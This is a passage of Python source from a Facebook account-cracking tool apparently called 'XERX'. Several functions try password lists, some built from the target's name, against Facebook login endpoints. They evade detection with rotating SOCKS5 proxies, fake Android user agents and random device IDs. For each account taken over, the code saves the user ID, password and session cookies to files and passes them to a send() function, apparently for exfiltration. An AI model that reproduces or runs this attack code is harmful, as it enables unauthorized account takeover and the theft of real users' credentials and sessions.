KmY1yyf3a1E6GpyspoHbCrpfMc4BLJwmJKO_61lKXM0PKSKuWTksklbTlLXKDARICrv-SFiKZbyGcAkZFXsiJDvP40sRj3-j4QnUNNLQ9x6gal01AzQsla2BLYkYSKBkJHUW19w_w7MvsdWLd-yiDdPBNfnIvTbGWDKUvvZydR11NrTrQy4ucraM-Wj8OKtOQ64Te5OMGVgUDnDc9ZA9pw4gRnXhCpbNbRm7S86qbnXVTX6OxO2Lx-NXsv4Pg3I1jMCY11Gp-pdzFkF76X8mqourutC2KidAUpCXDgoyZHMxT1pOEndB8ihvLWi55R&hrc=1&wtsid=rdr_0AFbwBGJ5Ba81n0Xh&_rdr").text
            data = {
    'lsd': re.search('name="lsd" value="(.*?)"', str(m2f)).group(1),
    'jazoest': re.search('name="jazoest" value="(.*?)"', str(m2f)).group(1),
    'm_ts': re.search('name="m_ts" value="(.*?)"', str(m2f)).group(1),
    'li': re.search('name="li" value="(.*?)"', str(m2f)).group(1),
    'try_number': '0',
    'unrecognized_tries': '0',
    'email': iid,
    'pass': ps,
    'login': 'Masuk',
    'bi_xrwh': '0'
}
            #print(data)
            head = {'Host': 'm.facebook.com', 'content-length': f'{len(str(data))}', 'sec-ch-ua': '"Not.A/Brand";v="13", "Chromium";v="114", "Google Chrome";v="112"', 'sec-ch-ua-mobile': '?1', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; RMX3617 Build/UKQ1.230917.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6377.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/456.0.0.14.378;]', 'viewport-width': 'str(rr(400,989)', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(m2f)).group(1), 'sec-ch-ua-platform-version': '"8.0.0"', 'x-asbd-id': '129477', 'x-requested-with': 'com.android.chrome', 'sec-ch-ua-full-version-list': '"Not.A/Brand";v="17.0.0.0", "Chromium";v="110.0.5581.126", "Google Chrome";v="113.0.2302.175"', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua-platform': '"Android"', 'accept': '*/*', 'origin': 'https://m.facebook.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=159513024983374&kid_directed_site=0&app_id=159513024983374&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D159513024983374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.icc-cricket.com%252F4ba9f276-2497-440e-a6ba-d05d4831b967%252Foauth2%252Fauthresp%26response_type%3Dcode%26scope%3Demail%2Bpublic_profile%26state%3DStateProperties%253DeyJTSUQiOiJ4LW1zLWNwaW0tcmM6MzI4MjQ4ZjAtNWQ5ZS00YmFjLWEyMDUtYjI4NTBlNmYzMDdjIiwiVElEIjoiNDE5OTNmYmEtYzg0Yy00N2YxLWFhMTAtNjBkNDIxNDdhMzQ1IiwiVE9JRCI6IjRiYTlmMjc2LTI0OTctNDQwZS1hNmJhLWQwNWQ0ODMxYjk2NyJ9%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D3b7e0aa4-9d25-4092-809a-78adc3fe1831%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.icc-cricket.com%2F4ba9f276-2497-440e-a6ba-d05d4831b967%2Foauth2%2Fauthresp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DStateProperties%253DeyJTSUQiOiJ4LW1zLWNwaW0tcmM6MzI4MjQ4ZjAtNWQ5ZS00YmFjLWEyMDUtYjI4NTBlNmYzMDdjIiwiVElEIjoiNDE5OTNmYmEtYzg0Yy00N2YxLWFhMTAtNjBkNDIxNDdhMzQ1IiwiVE9JRCI6IjRiYTlmMjc2LTI0OTctNDQwZS1hNmJhLWQwNWQ0ODMxYjk2NyJ9%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&rtime=1704667062&subno_key=AaGN11iBzQkbobWAE8sNNrZNynKmY1yyf3a1E6GpyspoHbCrpfMc4BLJwmJKO_61lKXM0PKSKuWTksklbTlLXKDARICrv-SFiKZbyGcAkZFXsiJDvP40sRj3-j4QnUNNLQ9x6gal01AzQsla2BLYkYSKBkJHUW19w_w7MvsdWLd-yiDdPBNfnIvTbGWDKUvvZydR11NrTrQy4ucraM-Wj8OKtOQ64Te5OMGVgUDnDc9ZA9pw4gRnXhCpbNbRm7S86qbnXVTX6OxO2Lx-NXsv4Pg3I1jMCY11Gp-pdzFkF76X8mqourutC2KidAUpCXDgoyZHMxT1pOEndB8ihvLWi55R&hrc=1&wtsid=rdr_0AFbwBGJ5Ba81n0Xh&_rdr', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9'}
            url = 'https://m.facebook.com/login/device-based/login/async/'
            po = session.post(url,data=data,headers=head,proxies=proxy,allow_redirects=False,verify=False).text
            log_cookies=session.cookies.get_dict().keys()
            if 'checkpoint' in log_cookies:
            
                idf = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                print(f'\033[1;31m [CP] {idf} | {ps} \033[0;m')
                break
            elif 'c_user' in log_cookies:
                #print(iid)
                #coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                idf = re.findall('c_user=(.*);xs', kuki)[0]
                rn = lock_check(idf)
                if rn =='LIVE':
                    
                    print(f'\033[1;32m [OK] {idf} | {ps} \033[0;m')
                    open('/sdcard/r-ok.txt', 'a').write(f'{idf}|{ps}\n')
                    open('/sdcard/r-ok_with_cookies.txt', 'a').write(f'{idf}|{ps}|{kuki}\n')
                    allx = f'{idf}|{ps}|{kuki}'
                    send(allx)
                    if 'y' in okcp:
                        check(session,kuki)
                    oks.append(idf)
                    break
                
                else:
                    open('/sdcard/r-dead.id_with_cookies.txt', 'a').write(f'{idf}|{ps}|{kuki}\n')
                #oks.append(idf)
                #break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
    except Exception as e:
        print(e)
def rm3(iid,passlist,tl):
    try:
        global oks,twf,loop
        sys.stdout.write(f"\r{loop}|{tl}; XERX|M3| OK: {len(oks)} \r")
        sys.stdout.flush()
        for ps in passlist:
            
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            #rr = random.choice
            #mode = f'Redmi {str(random.choice(4,9))}'
            proxy = {'https': 'socks5://'+random.choice(pro)}
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            redmi_models = ["CPH1869","CPH1929","CPH2107","CPH2238","CPH2389","CPH2401","CPH2407","CPH2413","CPH2415","CPH2417","CPH2419","CPH2455","CPH2459","CPH2461","CPH2471","CPH2473","CPH2477","CPH8893","CPH2321","CPH2341","CPH2373","CPH2083","CPH2071","CPH2077","CPH2185","CPH2179","CPH2269","CPH2421","CPH2349","CPH2271","CPH1923","CPH1925","CPH1837","CPH2015","CPH2073","CPH2081","CPH2029","CPH2031","CPH2137","CPH1605","CPH1803","CPH1853","CPH1805","CPH1809","CPH1851","CPH1931","CPH1959","CPH1933","CPH1935","CPH1943","CPH2061","CPH2069","CPH2127","CPH2131","CPH2139","CPH2135","CPH2239","CPH2195","CPH2273","CPH2325","CPH2309","CPH1701","CPH2387","CPH1909","CPH1920","CPH1912","CPH1901","CPH1903","CPH1905","CPH1717","CPH1801","CPH2067","CPH2099","CPH2161","CPH2219","CPH2197","CPH2263","CPH2375","CPH2339","CPH1715","CPH2385","CPH1729","CPH1827","CPH1938","CPH1937","CPH1939","CPH1941","CPH2001","CPH2021","CPH2059","CPH2121","CPH2123","CPH2203","CPH2333","CPH2365","CPH1913","CPH1911","CPH1915","CPH1969","CPH2209","CPH1987","CPH2095","CPH2119","CPH2285","CPH2213","CPH2223","CPH2363","CPH1609","CPH1613","CPH1723","CPH1727","CPH1725","CPH1819","CPH1821","CPH1825","CPH1881","CPH1823","CPH1871","CPH1875","CPH2023","CPH2005","CPH2025","CPH2207","CPH2173","CPH2307","CPH2305","CPH2337","CPH1955","CPH1707","CPH1719","CPH1721","CPH1835","CPH1831","CPH1833","CPH1879","CPH1893","CPH1877","CPH1607","CPH1611","CPH1917","CPH1919","CPH1907","CPH1989","CPH1945","CPH1951","CPH2043","CPH2035","CPH2037","CPH2036","CPH2009","CPH2013","CPH2113","CPH2091","CPH2125","CPH2109","CPH2089","CPH2065","CPH2159","CPH2145","CPH2205","CPH2201","CPH2199","CPH2217","CPH1921","CPH2211","CPH2235","CPH2251","CPH2249","CPH2247","CPH2237","CPH2371","CPH2293","CPH2353","CPH2343","CPH2359","CPH2357","CPH2457","CPH1983","CPH1979"]
            modx = random.choice(redmi_models)
            d = '{density=2.0,width=720,height=1280}'
            data = {'adid': str(adid), 'format': 'json', 'device_id': str(uuid.uuid4()), 'family_device_id': str(uuid.uuid4()), 'secure_family_device_id': str(uuid.uuid4()), 'cpl': 'true', 'try_num': '1', 'email': iid, 'password': ps, 'method': 'auth.login', 'generate_session_cookies': '1', 'sim_serials': "['80973453345210784798']", 'openid_flow': 'android_login', 'openid_provider': 'google', 'openid_emails': "['01710940017']", 'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']", 'error_detail_type': 'button_with_disabled', 'source': 'account_recovery', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
            fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(11, 99)}'
            head = {'User-Agent': m1file(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Host': 'graph.facebook.com', 'Content-Type': 'application/x-www-form-urlencoded', 'Priority': 'u=3, i', 'X-Fb-Sim-Hni': '45204', 'X-Fb-Net-Hni': '45201', 'X-Fb-Connection-Quality': 'GOOD', 'Zero-Rated': '0', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-Fb-Connection-Bandwidth': '24807555', 'X-Fb-Connection-Type': 'MOBILE.LTE', 'X-Fb-Device-Group': '5120', 'X-Tigon-Is-Retry': 'False', 'X-Fb-Friendly-Name': 'authenticate', 'X-Fb-Request-Analytics-Tags': 'unknown', 'X-Fb-Http-Engine': 'Liger', 'X-Fb-Client-Ip': 'True', 'X-Fb-Server-Cluster': 'True', 'Content-Length': '1676'}
            url = 'https://api.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head).json()
            #print(po)
            if 'session_key' in po:
                try:
                    uid = po['uid']
                except:
                    uid = iid
                cookie = "; ".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                savec = cookie + f'; dpr=2; locale=en_US; wd=950x1835; m_page_voice={uid}'
                rn = lock_check(uid)
                if rn =='LIVE':
                    print(f'\033[1;32m [OK] {uid} | {ps} \033[0;m')
                    
                    open('/sdcard/r-ok.txt', 'a').write(f'{uid}|{ps}\n')
                    open('/sdcard/r-ok_with_cookies.txt', 'a').write(f'{uid}|{ps}|{savec}\n')
                    allx = f'{uid}|{ps}|{savec}'
                    send(allx)
                    oks.append(uid)
                    break
                else:
                    open('/sdcard/r-dead.id_with_cookies.txt', 'a').write(f'{uid}|{ps}|{savec}\n')
                    break
                
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\033[1;31m [CP] {iid} | {ps} \033[0;m')
                break
            elif 'two_factor' in str(po):
                print(f'\033[1;36m [2F] {iid} | {ps} \033[0;m')
                break
            elif "Calls to this api have exceeded the rate limit." in po["error"]["message"]:
                
                sys.stdout.write(f"\r{loop}|{tl}; \033[1;31mSPAM|M1| OK: {len(oks)} \r");sys.stdout.flush()
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        print(e)
def rm4(iid,passlist,tl):
    try:
        global oks,twf,loop
        sys.stdout.write(f"\r{loop}|{tl}; XERX|M4| OK: {len(oks)} \r")
        sys.stdout.flush()
        for ps in passlist:
            
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            #rr = random.choice
            #mode = f'Redmi {str(random.choice(4,9))}'
            proxy = {'https': 'socks5://'+random.choice(pro)}
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            redmi_models = ["Redmi Note 11","Redmi 10","Redmi K40","Redmi 9","Redmi Note 10","Redmi 8","Redmi Note 9 Pro","Redmi 7","Redmi Note 8 Pro","Redmi 6A","Redmi Note 8"]
            modx = random.choice(redmi_models)
            d = '{density=2.0,width=720,height=1280}'
            data = {'adid':str(adid), 'format': 'json', 'device_id': device_id, 'email': iid, 'password': ps, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': family, 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '62f8ce9f74b12f84c123cc23437a4a32', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(11, 99)}'
            head = {'User-Agent': m4file(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '26849', 'X-FB-SIM-HNI': '22905', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head).json()
            #print(po)
            if 'session_key' in po:
                try:
                    uid = po['uid']
                except:
                    uid = iid
                cookie = "; ".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                savec = cookie + f'; dpr=2; locale=en_US; wd=950x1835; m_page_voice={uid}'
                rn = lock_check(uid)
                if rn =='LIVE':
                    print(f'\033[1;32m [OK] {uid} | {ps} \033[0;m')
                    
                    open('/sdcard/r-ok.txt', 'a').write(f'{uid}|{ps}\n')
                    open('/sdcard/r-ok_with_cookies.txt', 'a').write(f'{uid}|{ps}|{savec}\n')
                    allx = f'{uid}|{ps}|{savec}'
                    send(allx)
                    oks.append(uid)
                    break
                else:
                    open('/sdcard/r-dead.id_with_cookies.txt', 'a').write(f'{uid}|{ps}|{savec}\n')
                    break
                
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\033[1;31m [CP] {iid} | {ps} \033[0;m')
                break
            elif 'two_factor' in str(po):
                print(f'\033[1;36m [2F] {iid} | {ps} \033[0;m')
                break
            elif "Calls to this api have exceeded the rate limit." in po["error"]["message"]:
                
                sys.stdout.write(f"\r{loop}|{tl}; \033[1;31mSPAM|M1| OK: {len(oks)} \r");sys.stdout.flush()
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        print(e)
        
        
        
xx=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()        
def rm5(iid,passlist,tl):
    global oks,twf,loop
    
    
    try:
        for ps in passlist:
            session = requests.Session()
            sys.stdout.write(f"\r{loop}|{tl}; XERX|M5| OK: {len(oks)} \r")
            sys.stdout.flush()
            prox= random.choice(xx)
            rr = random.randint;rc = random.choice
            proxy = {'http': 'socks5://'+random.choice(pro)}
            mdl = ["Redmi Note 11","Redmi 10","Redmi K40","Redmi 9","Redmi Note 10","Redmi 8","Redmi Note 9 Pro"]
            uau = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,13))+"; "+str(random.choice(mdl))+" Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            m2f = session.get("https://m.facebook.com").text
            fbcr = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=1))
            current_time = int(time.time())
            encpass = (f'#PWD_BROWSER:0:{current_time}:{ps}')
            data = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(m2f)).group(1), 'li': re.search('name="li" value="(.*?)"', str(m2f)).group(1), 'try_number': 0, 'unrecognized_tries': 0, 'email': iid, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': False, 'had_password_prefilled': False, 'is_smart_lock': False, 'bi_xrwh': 0, 'encpass': encpass, 'jazoest': re.search('name="jazoest" value="(.*?)"', str(m2f)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', str(m2f)).group(1), '__dyn': '', '__csr': '', '__req': str(fbcr), '__a': '', '__user': 0}
            #print(data)
            head = {'Host': 'm.facebook.com', 'accept': '*/*', 'accept-language': 'en-US,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded', 'dpr': '1.7125', 'origin': 'https://m.prod.facebook.com', 'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=739959012779189&kid_directed_site=0&app_id=739959012779189&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D739959012779189%26redirect_uri%3Dhttps%253A%252F%252Fauth.fastwork.id%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%2Bpublic_profile%26state%3DqPv-GtB_fLN8gGLdovAoybajnyvyhC8CVVgi_4dOd9-LJrTLdtf3uY7Iv4ZQmUtzIMaBfyBifKqGOIprMK-74w%253D%253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbdf7eebb-e161-409b-a6ff-ce160c7a328f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.fastwork.id%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DqPv-GtB_fLN8gGLdovAoybajnyvyhC8CVVgi_4dOd9-LJrTLdtf3uY7Iv4ZQmUtzIMaBfyBifKqGOIprMK-74w%253D%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"', 'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-ch-ua-platform-version': '"12.0.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': prox, 'viewport-width': '421', 'x-asbd-id': '129477', 'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(m2f)).group(1), 'x-requested-with': 'XMLHttpRequest', 'x-response-format': 'JSONStream'}
            url = 'https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100'
            po = session.post(url,data=data,headers=head,proxies=proxy,allow_redirects=False,verify=False).text
            log_cookies=session.cookies.get_dict().keys()
            if 'checkpoint' in log_cookies:
            
                idf = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                print(f'\033[1;31m [CP] {idf} | {ps} \033[0;m')
                break
            elif 'c_user' in log_cookies:
                #print(iid)
                #coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                idf = re.findall('c_user=(.*);xs', kuki)[0]
                rn = lock_check(idf)
                if rn =='LIVE':
                    
                    print(f'\033[1;32m [OK] {idf} | {ps} \033[0;m')
                    open('/sdcard/r-ok.txt', 'a').write(f'{idf}|{ps}\n')
                    open('/sdcard/r-ok_with_cookies.txt', 'a').write(f'{idf}|{ps}|{kuki}\n')
                    allx = f'{idf}|{ps}|{kuki}'
                    send(allx)
                    if 'y' in okcp:
                        check(session,kuki)
                    oks.append(idf)
                    break
                
                else:
                    open('/sdcard/r-dead.id_with_cookies.txt', 'a').write(f'{idf}|{ps}|{kuki}\n')
                #oks.append(idf)
                #break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
    except Exception as e:
        print(e)
def m1(ids,names,passlist,tl):
    try:
        global oks,loop
        sys.stdout.write(f"\r{loop}|{tl}; XERX|M1| OK: {len(oks)} \r");sys.stdout.flush()
        fn = names.split(' ')[0]
        loop+=1
        r = requests.Session()
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            #print(pas)
            data= {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {'User-Agent': m1file(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url,data=data, headers=head,allow_redirects=False).json()
            if 'session_key' in po:
                uid = po['uid']
                print(f'\033[1;32m [OK-Xerx] {uid} | {pas} \033[0;m')
                session = po['session_cookies']
                datr = session[3]['name']+'='+session[3]['value']
                cookie = "; ".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_")
                savec = f'sb={sb};{cookie}'
                newck = ConvertCookie(savec,datr)
                open('/sdcard/m1-ok.txt', 'a').write(f'{uid}|{pas}\n')
                open('/sdcard/m1-ok_with_cookies.txt', 'a').write(f'{uid}|{pas}|{newck}\n')
                allx = f'{uid}|{pas}|{newck}'
                send(allx)
                oks.append(uid)
                if 'y' in ldd:
                    print(f' [COOKIE] {newck}')
                if 'y' in apc:
                    check(r,newck)
                
                break
            elif 'www.facebook.com' in po['error']['message']:
                if 'y' in okcp:
                    print(f'\033[1;31m [CP-Xerx] {ids} | {pas} \033[0;m')
                cps.append(ids)
                break
            elif 'two_factor' in str(po):
                if 'y' in okcp:
                    print(f'\033[1;36m [2F-Xerx] {ids} | {pas} \033[0;m')
                break
            elif "The action attempted has been deemed abusive or is otherwise disallowed" in po["error"]["message"]:
                
                sys.stdout.write(f"\r{loop}|{tl}; \033[1;31mSPAM|M1| OK: {len(oks)}\r");sys.stdout.flush()
            
            else:
                continue
        loop+=1
    
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        print(e)
        #m1(ids,names,passlist)
def m2(ids,names,passlist,tl):
    try:
        global oks,loop
        sys.stdout.write(f"\r{loop}|{tl}; XERX|M2| OK: {len(oks)} \r");sys.stdout.flush()
        fn = names.split(' ')[0]
        loop+=1
        r = requests.Session()
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            data= {'adid':str(adid), 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': family, 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '62f8ce9f74b12f84c123cc23437a4a32', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head = {'User-Agent': m2file(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '26849', 'X-FB-SIM-HNI': '22905', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data, headers=head,allow_redirects=False).json()
            if 'session_key' in po:
                uid = po['uid']
                print(f'\033[1;32m [OK-Xerx] {uid} | {pas} \033[0;m')
                session = po['session_cookies']
                datr = session[3]['name']+'='+session[3]['value']
                cookie = "; ".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_")
                savec = f'sb={sb};{cookie}'
                newck = ConvertCookie(savec,datr)
                open('/sdcard/m2-ok.txt', 'a').write(f'{uid}|{pas}\n')
                open('/sdcard/m2-ok_with_cookies.txt', 'a').write(f'{uid}|{pas}|{newck}\n')
                allx = f'{uid}|{pas}|{newck}'
                send(allx)
                oks.append(uid)
                if 'y' in ldd:
                    print(f' [COOKIE] {newck}')
                if 'y' in apc:
                    check(r,newck)
                
                break
            elif 'www.facebook.com' in po['error']['message']:
                if 'y' in okcp:
                    
                    print(f'\033[1;31m [CP-Xerx] {ids} | {pas} \033[0;m')
                cps.append(ids)
                break
            elif 'two_factor' in str(po):
                if 'y' in okcp:
                    print(f'\033[1;36m [2F-Xerx] {ids} | {pas} \033[0;m')
                break
